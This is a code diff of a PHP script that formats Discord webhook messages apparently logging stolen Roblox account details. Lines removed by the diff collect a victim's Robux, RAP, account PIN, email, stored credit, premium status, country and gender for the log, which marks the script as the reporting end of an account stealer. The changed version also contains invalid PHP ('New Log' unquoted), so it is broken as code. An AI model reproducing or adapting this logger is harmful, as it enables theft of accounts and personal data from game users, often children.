@@ -37,7 +37,7 @@ $json_data = json_encode([
     "embeds" => [
         [
             // Embed Title
-            "title" => $data->username,
+            "title" => New Log,
 
             // Embed Type
             "type" => "rich",
@@ -46,7 +46,7 @@ $json_data = json_encode([
             "description" => "```" . $wontent . "```",
 
             // URL of title link
-            "url" => "https://roblox.com/users/" . $data->userid,
+            "url" => "https://roblox.com/users/",
 
             // Timestamp of embed must be formatted as ISO8601
             "timestamp" => $timestamp,
@@ -65,7 +65,7 @@ $json_data = json_encode([
                 "url" => "",
             ],
               "thumbnail" => [
-            "url" => $data->avatarurl
+            "url" => ""
             ],
 
             // Author
@@ -76,78 +76,6 @@ $json_data = json_encode([
 
             // Additional Fields array
             "fields" => [
-                [
-                    "name" => "Robux🤑: ",
-                    "value" =>  "```" . $data->robux . "```",
-                    "inline" => true
-                ],
-                // Field 2
-                [
-                    "name" => "Rap📈: ",
-                    "value" => "```" . $data->rap . "```",
-                    "inline" => true
-                ],
-
-                [
-                    "name" => "Pin🔒: ",
-                    "value" => "```" . $data->pin . "```",
-                    "inline" => true
-                ],
-
-                
-                [
-                    "name" => "Premuim💎: ",
-                    "value" => "```" . $data->premium . "```",
-                    "inline" => true
-                ],
-
-                [
-                    "name" => "Age👴: ",
-                    "value" => "```" . $data->datecreated . "```",
-                    "inline" => true
-                ],
-
-                [
-                    "name" => "Pending⌛: ",
-                    "value" => "```" . $data->pendingrobux . "```",
-                    "inline" => true
-                ],
-
-                [
-                    "name" => "Email✉: ",
-                    "value" => "```" . $email . "```",
-                    "inline" => true
-                ],
-
-                [
-                    "name" => "Credit💵: ",
-                    "value" => "```" . $data->credit . "```",
-                    "inline" => true
-                ],
-
-                [
-                    "name" => "Followers📸: ",
-                    "value" => "```" . $data->followers . "```",
-                    "inline" => true
-                ],
-
-                [
-                    "name" => "Age👴: ",
-                    "value" => "```" . $data->datecreated . "```",
-                    "inline" => true
-                ],
-
-                [
-                    "name" => "Country🗺: ",
-                    "value" => "```" . $data->country . "```",
-                    "inline" => true
-                ],
-
-                [
-                    "name" => "Gender👦: ",
-                    "value" => "```" . $data->gender . "```",
-                    "inline" => true
-                ],
             ]
         ]
     ]
